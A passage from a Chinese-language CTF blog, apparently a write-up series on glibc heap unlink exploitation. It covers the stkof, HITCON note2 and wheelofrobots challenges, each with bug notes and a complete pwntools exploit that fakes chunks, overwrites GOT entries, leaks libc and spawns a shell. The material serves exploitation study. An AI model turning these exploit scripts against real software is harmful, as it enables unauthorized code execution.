class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">&#x27;./stkof&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./stkof&#x27;</span>)</span><br><span class="line">head=<span class="number">0x602140</span>  <span class="comment">#but the first not use so....</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">idx,length,content</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">p.send(content)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x30</span>)</span><br><span class="line">alloc(<span class="number">0x80</span>)   <span class="comment">#ensure chunksize &gt;MAX_fastbin(0x80)</span></span><br><span class="line"><span class="comment">#alloc(0x20)</span></span><br><span class="line"></span><br><span class="line">payload1=p64(<span class="number">0</span>)+p64(<span class="number">0x20</span>)+p64(head-<span class="number">0x8</span>)+p64(head)+p64(<span class="number">0x20</span>)<span class="comment">#fake chunk and unlink trigger</span></span><br><span class="line">payload1=payload1.ljust(<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>)  <span class="comment">#pudding</span></span><br><span class="line">payload1+=p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)  <span class="comment">#edit prev_inuse bit</span></span><br><span class="line"></span><br><span class="line">read(<span class="number">2</span>,<span class="built_in">len</span>(payload1),payload1)</span><br><span class="line">free(<span class="number">3</span>)   <span class="comment">#trigger unlink</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(e.got[<span class="string">&#x27;free&#x27;</span>])+p64(e.got[<span class="string">&#x27;puts&#x27;</span>])+p64(e.got[<span class="string">&#x27;free&#x27;</span>])<span class="comment">#depoloy 0,1,2</span></span><br><span class="line"></span><br><span class="line">read(<span class="number">2</span>,<span class="built_in">len</span>(payload2),payload2)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">read(<span class="number">0</span>,<span class="number">8</span>,p64(e.plt[<span class="string">&#x27;puts&#x27;</span>]))  <span class="comment">#free -&gt;puts</span></span><br><span class="line">free(<span class="number">1</span>)  <span class="comment">##puts(plt_addr)</span></span><br><span class="line">puts_got=p.recvuntil(<span class="string">&#x27;\nOK\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">puts_got=u64(puts_got)</span><br><span class="line">log.success(<span class="string">&#x27;puts_plt:&#x27;</span>+<span class="built_in">hex</span>(puts_got))</span><br><span class="line">libc_base=puts_got-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">read(<span class="number">2</span>,<span class="number">8</span>,p64(system))<span class="comment">#free -&gt; puts -&gt; system</span></span><br><span class="line">alloc(<span class="number">0x20</span>)</span><br><span class="line">read(<span class="number">4</span>,<span class="number">8</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)<span class="comment">#system(&#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这题chunk靠不靠近top_chunk不是很重要影响不大</p><p>另外特别要注意一点是:<strong>chunk3的大小要超过fastbin的最大大小</strong>,不然的话释放chunk3<u>直接进入fastbin</u>就不会触发unlink了</p><p><strong>最后提一下gdb的显示问题,gdb会从堆的开始判断chunk的个数,以这题为例,unlink后chunk2和chunk3依然存在,这是因为gdb先判断的chunk2,这样就把我们伪造的chunk的头给包含进chunk2了,于是unlink后的chunk就没有被gdb识别,反而chunk3继续存在</strong></p><h2 id="2014HITCON-note2"><a href="#2014HITCON-note2" class="headerlink" title="2014HITCON note2"></a>2014HITCON note2</h2><p><strong>难度:★★</strong></p><p>和上一题几乎一个套路,也是标准的unlink题</p><p>防护pie没开,以及got表可写</p><p>关键的利用点在于一个整数溢出点,是的可以达到无限读的目的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_4009BD</span><span class="params">(__int64 a1, __int64 a2, <span class="type">char</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+2Fh] [rbp-11h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">ssize_t</span> v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; a2 - <span class="number">1</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(i + a1) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(a1 + i) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>i是无符号整型,a2是有符号数,如果a2等于0,那么a2-1就是-1就会被视为一个极大的无符号数</p><p>其它和上一题一个套路</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">&#x27;./note2&#x27;</span>)</span><br><span class="line">note2 = ELF(<span class="string">&#x27;./note2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">newnote</span>(<span class="params">length, content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;(less than 128)&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;content:&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shownote</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;note:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">editnote</span>(<span class="params"><span class="built_in">id</span>, choice, s</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;note:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;2.append]&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line">    p.sendline(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deletenote</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;note:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line">ptr0=<span class="number">0x602120</span></span><br><span class="line">content=p64(<span class="number">0</span>)+p64(<span class="number">0x60</span>)+p64(ptr0-<span class="number">0x18</span>)+p64(ptr0-<span class="number">0x10</span>)+p64(<span class="number">0</span>)*<span class="number">8</span>+p64(<span class="number">0x60</span>)  </span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;name&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;address&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">newnote(<span class="number">0x80</span>,content)</span><br><span class="line">newnote(<span class="number">0</span>,p64(<span class="number">0</span>))</span><br><span class="line">newnote(<span class="number">0x80</span>,p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">deletenote(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">content=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xa0</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">newnote(<span class="number">0</span>,content)</span><br><span class="line"></span><br><span class="line">deletenote(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">content=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(note2.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line"></span><br><span class="line">editnote(<span class="number">0</span>,<span class="number">1</span>,content)</span><br><span class="line"></span><br><span class="line">shownote(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;is &#x27;</span>)</span><br><span class="line">atoi_addr = p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">atoi_addr=u64(atoi_addr.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(atoi_addr))</span><br><span class="line">libc_base=atoi_addr-libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">content = p64(system_addr)</span><br><span class="line"></span><br><span class="line">editnote(<span class="number">0</span>, <span class="number">1</span>, content)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;\bin\sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>注意点:</strong>strnat,strcpy这些函数结束判断都与’\0’有极大关系,故而相关填充时就不能随意填充0了,否则可能达不到我们需要的效果</p><h2 id="2017-insomni’hack-wheelofrobots"><a href="#2017-insomni’hack-wheelofrobots" class="headerlink" title="2017 insomni’hack wheelofrobots"></a>2017 insomni’hack wheelofrobots</h2><p><strong>难度:★★★</strong></p><p>难度更上一筹,对漏洞的发现能力要求更高</p><p>防护依然是canary和nx</p><p><strong>利用点1:</strong>读取选项的函数,读取5个字节,最后一个字节恰好能覆盖到bender的inuse状态位</p><p><strong>利用点2:</strong>在添加 Destructor 轮子的时候，并没有进行大小检测。如果读取的数为负数，那么在申请<code>calloc(1uLL, 20 * v5);</code> 时就可能导致 <code>20*v5</code> 溢出，但与此同时， <code>destructor_size = v5</code> 仍然会很大。</p><p>利用思路要更复杂,要记清楚各个指针的地址就不容易了,逻辑也要更清晰才行</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary = <span class="string">&quot;./wofr&quot;</span></span><br><span class="line">robots = ELF(<span class="string">&#x27;./wofr&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./wofr&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size=<span class="number">0</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">2</span>:</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;Increase Bender&#x27;s intelligence: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">3</span>:</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;Increase Robot Devil&#x27;s cruelty: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">6</span>:</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;Increase Destructor&#x27;s powerful: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">idx</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">idx, name</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Robot&#x27;s name: \n&quot;</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_robot</span>():</span><br><span class="line">    p.recvuntilb(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">overflow_benderinuse</span>(<span class="params">inuse</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.send(<span class="string">b&#x27;9999&#x27;</span> + inuse)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">where, what</span>):</span><br><span class="line">    change(<span class="number">1</span>, p64(where))</span><br><span class="line">    change(<span class="number">6</span>, p64(what))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;step 1&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># add a fastbin chunk 0x20 and free it</span></span><br><span class="line">    <span class="comment"># so it is in fastbin, idx2-&gt;NULL</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">1</span>)  <span class="comment"># idx2</span></span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overflow bender inuse with 1</span></span><br><span class="line">    overflow_benderinuse(<span class="string">b&#x27;\x01&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># change bender&#x27;s fd to 0x603138, point to bender&#x27;s size</span></span><br><span class="line">    <span class="comment"># now fastbin 0x20, idx2-&gt;0x603138-&gt;NULL</span></span><br><span class="line">    change(<span class="number">2</span>, p64(<span class="number">0x603138</span>))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment"># in order add bender again</span></span><br><span class="line">    overflow_benderinuse(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># add bender again, fastbin 0x603138-&gt;NULL</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># in order to malloc chunk at 0x603138</span></span><br><span class="line">    <span class="comment"># we need to bypass the fastbin size check, i.e. set *0x603140=0x20</span></span><br><span class="line">    <span class="comment"># it is at Robot Devil</span></span><br><span class="line">    add(<span class="number">3</span>, <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># trigger malloc, set tinny point to 0x603148</span></span><br><span class="line">    add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># wheels must &lt;= 3</span></span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line">    remove(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;step 2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># alloc Destructor size 60-&gt;0x50, chunk content 0x40</span></span><br><span class="line">    add(<span class="number">6</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># alloc devil, size=20*7=140, bigger than fastbin</span></span><br><span class="line">    add(<span class="number">3</span>, <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># edit destructor&#x27;s size to 1000 by tinny</span></span><br><span class="line">    change(<span class="number">1</span>, p64(<span class="number">1000</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># place fake chunk at destructor&#x27;s pointer</span></span><br><span class="line">    fakechunk_addr = <span class="number">0x6030E8</span></span><br><span class="line">    fakechunk = p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(fakechunk_addr - <span class="number">0x18</span>) + p64(</span><br><span class="line">        fakechunk_addr - <span class="number">0x10</span>) + p64(<span class="number">0x20</span>)</span><br><span class="line">    fakechunk = fakechunk.ljust(<span class="number">0x40</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    fakechunk += p64(<span class="number">0x40</span>) + p64(<span class="number">0xa0</span>)</span><br><span class="line">    change(<span class="number">6</span>, fakechunk)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># trigger unlink</span></span><br><span class="line">    remove(<span class="number">3</span>) <span class="comment">#unlink 6</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;step 3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># make 0x6030F8 point to 0x6030E8</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) * <span class="number">2</span> + <span class="number">0x18</span> * <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0x6030E8</span>)</span><br><span class="line">    change(<span class="number">6</span>, payload)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;step 4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># make exit just as return</span></span><br><span class="line">    write(robots.got[<span class="string">&#x27;exit&#x27;</span>], <span class="number">0x401954</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;step 5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># set wheel cnt =3, 0x603130 in order to start robot</span></span><br><span class="line">    write(<span class="number">0x603130</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># set destructor point to puts@got</span></span><br><span class="line">    change(<span class="number">1</span>, p64(robots.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">    start_robot()</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;New hands great!! Thx &#x27;</span>)</span><br><span class="line">    puts_addr = p.recvuntil(<span class="string">b&#x27;!\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    puts_addr = u64(puts_addr)</span><br><span class="line">    log.success(<span class="string">&#x27;puts addr: &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># make free-&gt;system</span></span><br><span class="line">    write(robots.got[<span class="string">&#x27;free&#x27;</span>], system_addr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># make destructor point to /bin/sh addr</span></span><br><span class="line">    write(<span class="number">0x6030E8</span>, binsh_addr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get shell</span></span><br><span class="line">    remove(<span class="number">6</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><h2 id="2014ZCTF-note3"><a href="#2014ZCTF-note3" class="headerlink" title="2014ZCTF note3"></a>2014ZCTF note3</h2><p><strong>难度:★★</strong></p><p>难度和前几题差不多,<strong>但有一个大坑!!</strong></p><p><strong>利用点1:</strong>如果size输入0,会存在一个无符号整型与有符号整型的比较,造成整数溢出,几乎可以无限输入</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 